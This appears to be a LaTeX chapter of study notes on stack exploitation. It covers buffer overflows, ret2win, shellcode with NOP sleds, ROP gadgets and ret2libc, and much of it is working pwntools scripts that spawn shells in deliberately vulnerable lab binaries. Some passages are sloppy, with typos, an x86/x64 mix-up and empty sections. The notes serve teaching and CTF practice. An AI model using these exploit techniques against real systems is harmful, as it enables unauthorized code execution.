
\section{Stack Exploitation}

\subsection{Introduction}
The most basic forms of binary exploitation occur on the stack.
Because the {\bf Instruction Pointer} is saved on the stack, just like 
local variables. When a function is called and when the function return it pops
the instruction pointer and jump to it. If an attacker is able to overwrite
this instruction pointer he will be able highjack the execution flow.

Such a situation occurs when a function is allocating a buffer on the stack and
an insecure function is used to parse the user input to store it in the buffer.

An insecure function (or use of function) is a function that will write more
data to the buffer that its actual size.*
\begin{verbatim}
void unsafe() {
    char buffer[40];

    puts("Overflow me");
    gets(buffer);
}
\end{verbatim}

in order to be efficient it is possible to provide a {\bf e Bruijn sequences of
order $n$}, which is simply a sequence where no string of \verb+n+ characters
is repeated.

this can be done using \verb+pwntools-pwn cyclic+ or \verb+pattern_create.rb+ of
metasploit. 
\begin{verbatim}
p/opt/metasploit/tools/exploit/attern_create.rb -l <size> 
pwntools-pwn cyclic <size>
\end{verbatim}

when such a string is provided and generate a segmentation fault, the
instruction pointer will contain a substring of the sequence. It is then
possible to obtain the offset of the instruction pointer in the input
\begin{verbatim}
/opt/metasploit/tools/exploit/pattern_offset.rb -q Aa3A
pwntools-pwn cyclic -l faad
\end{verbatim}

So the global payload is split into:
\begin{itemize}
    \item playload of \verb+offset+ size
    \item return address
\end{itemize}

\subsection{ret2win}
A ret2win is simply a binary where there is a {\emph win} function to which the
redirection to it is sufficient.
\begin{verbatim}
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[40];

    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}

void flag() {
    puts("Exploited!!!!!");
}

\end{verbatim}

based on the offset found the only thing remaining to do is to get the address
of the function we need to jump to
it can be obtained with \verb+gdb+, \verb+objdump+
\begin{verbatim}
80491c2:       c3                      ret

080491c3 <flag>:
 80491c3:       55                      push   %ebp
\end{verbatim}

\begin{verbatim}
readelf --symbols --wide vuln | grep FUNC
...SNIP...    
66: 080491c3    43 FUNC    GLOBAL DEFAULT   13 flag
67: 08049000     0 FUNC    GLOBAL HIDDEN    11 _init
\end{verbatim}

in order to craft the payload the endianness must be taken into account
\begin{verbatim}
$ readelf --headers vuln |grep endian
  Data:                              2's complement, little endian
\end{verbatim}

so in this case \verb+080491c3+ will be \verb+\xc3\x91\x04\x08+

the payload here is quite simple:
\begin{verbatim}
$(python -c "print('\x55' * offset + '\x08\x04\x91\xc3')")
\end{verbatim}

with pwntools:
\begin{verbatim}
from pwn import *            # This is how we import pwntools

p = process('./vuln')        # We're starting a new process

payload = b'A' * 52
payload += p32(0x080491c3)   # or p64 Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
\end{verbatim}

\subsection{shellcode}

\begin{verbatim}
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];

    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}
\end{verbatim}

in this attack the payload will contain shellcode and we will over-ride the
instruction pointer on the stack with the address of the buffer. Therefore the
process will execute the shellcode.

Note: for this to work:
\begin{itemize}
    \item ASLR must be disabled (\verb+/proc/sys/kernel/randomize_va_space+
        must be 0)
    \item the stack must be executable
\end{itemize}

\begin{verbatim}
$ pwntools-pwn checksec ./vuln
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
\end{verbatim}

so the payload will be of the form
\verb+<shellcode><padding><address of shellcode>+

first we need to find the address of the buffer which will be also the address
of the shellcode we need to jump to.

this can be done with \verb+gdb+ 
input for exemple enough \verb+\x61+ to stack overflow.
then inspect the stack in order to find where the first \verb+\x61+ start with
a command like
\begin{verbatim}
gef>  x/1000cb $esp
...SNIP...
0xffffb5b0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5b8:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5c0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5c8:     0x61    0x61    0x61    0x61    0x0     0x55    0x55    0x55
0xffffb5d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
\end{verbatim}

so the start address of the buffer is \verb-0xffffb5c8 + 3- (i.e. \verb+0xffffb5cb+)

find the offset (and then the payload size) with \verb+pwntools-pwn cyclic+

craft a shellcode and compute the final payload
\begin{verbatim}
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffb5cb)              # or p64 Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
\end{verbatim}

Note: it might be necessary when crafting a payload to eliminate {\bf bad
caracters}. Bad characters can vary, but often we will see characters like this:
\begin{itemize}
    \item \verb+\x00+ - Null Byte
    \item \verb+\x0A+ - Line Feed
    \item \verb+\x0D+ - Carriage Return
    \item \verb+\xFF+ - Form Feed
\end{itemize}

to identify bad chars: craft a payload containing all possible chars and
inspect the stack to see if some are missing.

this has to be done as an iterative process until all injected chars are
present in the buffer.

msfvenom offer a \verb+-bad-chars "<chars>"+ parameter when generating a
shellcode.

for pwntools the use of 
\verb+pwnlib.encoders.encoder.encode(raw_bytes, avoid, expr, force)+


\subsection{NOPs}

NOP (no operation) instructions do exactly what they sound like: nothing. Which
makes then very useful for shellcode exploits, because all they will do is run
the next instruction. If we pad our exploits on the left with NOPs and point
EIP at the middle of them, it'll simply keep doing no instructions until it
reaches our actual shellcode. This allows us a greater margin of error as a
shift of a few bytes forward or backwards won't really affect it, it'll just
run a different number of NOP instructions - which have the same end result of
running the shellcode. This padding with NOPs is often called a {\bf NOP slide}
or {\bf NOP sled}, since the EIP is essentially sliding down them.

\begin{verbatim}
from pwn import *

payload = b'\x90' * 240                 # The NOPs
payload += asm(shellcraft.sh())         # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4 + 120)        # or p64 Address of the buffer + half nop length
\end{verbatim}

\subsection{Return oriented programming (ROT)}

\subsubsection{Introduction}
ROP is a technic used in case a program has  NX bit set (meaning the stack will
not be executable).

The basis of ROP is chaining together small chunks of code already present
within the binary itself in such a way to do what you wish. This often involves
passing parameters to functions already present within \verb+libc+, such as
\verb+system+ 

\subsubsection{Gadgets}
Gadgets are small snippets of code followed by a i\verb+ret+ instruction, e.g.
\verb+pop rdi; ret+. We can manipulate the ret of these gadgets in such a way
as to string together a large chain of them to do what we want.

for example consider we want to call a function and pass it a value in
\verb+rdi+ (first argument provided in \verb+x64+).

Consider we find a gadget \verb+pop rdi ; ret+

the crafting a payload like this will do the job
\verb+<padding_until_rip><gadget_addr><value><fun_addr>+. This mean
\verb+<gadget_addr>+ replace the initial return value of the vulnerable function.

then what will happen is that when the \verb+ret+ of the vuln function execut
it pop the address of \verb+pop rdi+ then it push \verb+value+ in \verb+rdi+
then it exec the \verb+ret+ jumping to the function we want.


to find gadgets: 
\begin{verbatim}
$ ROPgadget --binary ./vuln
Gadgets information
============================================================
0x080490da : adc al, 0x68 ; and al, al ; add al, 8 ; call eax
0x08049052 : adc al, 0xc0 ; add al, 8 ; push 0x10 ; jmp 0x8049020
0x08049042 : adc al, al ; add al, 8 ; push 8 ; jmp 0x8049020
0x08049126 : adc byte ptr [eax + 0x68], dl ; and al, al ; add al, 8 ; call edx
0x080491aa : adc byte ptr [eax - 0x3603a275], dl ; ret
0x08049057 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8049020
...SNIP...
0x08049015 : test eax, eax ; je 0x804901b ; call eax

Unique gadgets found: 124
\end{verbatim}

\subsubsection{Exploiting x86 call convention}

since in \verb+x64+ all parameters are on the stack the exploit is quite simple
the payload is like this
\begin{verbatim}
<padding_until_RIP><fun_addr><rip_for_fun><param_1>...<param_n>
\end{verbatim}
regarding \verb+rip_for_fun+ we don't care where it jumps.
\begin{verbatim}
from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}

\subsubsection{ret2libc}

A \verb+ret2libc+ is based off the \verb+system+ function found within the C
library. This function executes anything passed to it making it the best
target. Another thing found within libc is the string \verb+/bin/sh+; if you
pass this string to system, it will pop a shell.

\begin{itemize}
    \item Getting Libc and its base:
\begin{verbatim}
$ ldd vuln-32
\end{verbatim}

    \item Getting the location of \verb+system()+
\begin{verbatim}
$ readelf -s <libc_path> | grep system
\end{verbatim}

    \item Getting the location of \verb+/bin/sh+: 
\begin{verbatim}
$ strings -a -t x <libc_path> | grep /bin/sh 
\end{verbatim}
\end{itemize}

\begin{verbatim}
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}

\begin{verbatim}
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}

\subsubsection{Exploiting x64 call convention}
more complex since most parameters are in registers. So we need to find gadget
that will \verb+pop+ into registers. We might have to chain them.
\begin{verbatim}
from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}


\subsection{Format string bug}


\subsection{Canaries}



\subsection{Stack pivoting}
Stack Pivoting is a technique used when facing lack space on the stack - for
example, having 16 bytes past RIP. In this scenario, it isnot possible to
complete a full ROP chain.

During Stack Pivoting, the shellcode take control of the RSP register and
"fake" the location of the stack. There are a few ways to do this.

\url{https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting}


